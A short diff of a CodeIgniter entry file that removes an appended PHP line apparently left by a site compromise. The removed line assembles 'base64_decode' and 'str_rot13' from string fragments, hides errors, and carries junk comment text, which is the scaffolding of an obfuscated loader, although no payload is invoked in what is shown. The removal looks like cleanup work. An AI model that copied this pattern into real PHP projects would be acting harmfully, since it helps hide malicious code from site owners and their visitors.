@@ -308,4 +308,3 @@ require_once BASEPATH . 'core/CodeIgniter.php';
 
 
 
-<?php $nXUeC = 'ba'.'se'.'64'.'_de'.'code';  $Evtxa = 's'.'tr'.'_rot1'.'3';  /*     frvwa k gevtzwyrxjqaumpnzeluo jhkhbim        ***/ ini_set('display_errors', 0); echo '<html>       </html>'; error_reporting(0); ?>
